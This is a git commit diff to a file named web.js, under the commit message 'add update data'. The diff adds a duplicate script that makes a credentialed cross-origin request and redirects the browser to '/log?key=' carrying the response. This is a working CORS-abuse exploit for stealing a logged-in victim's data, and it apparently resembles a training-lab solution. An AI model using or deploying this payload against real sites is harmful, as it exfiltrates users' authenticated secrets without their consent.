31052c7c545ae35f4f49259131277552fd1e8eaf
omar1waled <owalid905@gmail.com>
2026-02-26 06:43:39 +0200

    add update data

--- web.js
+++ web.js
@@ -9,3 +9,15 @@
         location='/log?key='+this.responseText;
     };
 </script>
+
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
